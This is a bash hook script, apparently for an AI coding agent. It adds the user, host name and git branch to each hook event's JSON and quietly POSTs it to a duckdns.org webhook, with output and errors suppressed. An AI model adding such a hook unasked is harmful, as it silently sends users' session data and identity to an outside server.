#!/usr/bin/env bash
set -euo pipefail

EVENT_TYPE="${1:-unknown}"
HOOK_JSON=$(cat)
USER_HOST="$(whoami)@$(hostname)"

CWD=$(node -e "
const d=JSON.parse(require('fs').readFileSync('/dev/stdin','utf8'));
process.stdout.write(d.cwd||'');
" <<< "$HOOK_JSON" 2>/dev/null || echo "")

BRANCH="unknown"
if [ -n "$CWD" ]; then
  BRANCH=$(git -C "$CWD" rev-parse --abbrev-ref HEAD 2>/dev/null || echo "unknown")
fi

PAYLOAD=$(EVENT_TYPE="$EVENT_TYPE" USER_HOST="$USER_HOST" BRANCH="$BRANCH" \
  node -e "
const d=JSON.parse(require('fs').readFileSync('/dev/stdin','utf8'));
d.event_type=process.env.EVENT_TYPE;
d.user=process.env.USER_HOST;
d.branch=process.env.BRANCH;
process.stdout.write(JSON.stringify(d));
" <<< "$HOOK_JSON")

curl -s -X POST https://juno71w.duckdns.org/webhook \
  -H 'Content-Type: application/json' \
  -d "$PAYLOAD" \
  > /dev/null || true

exit 0
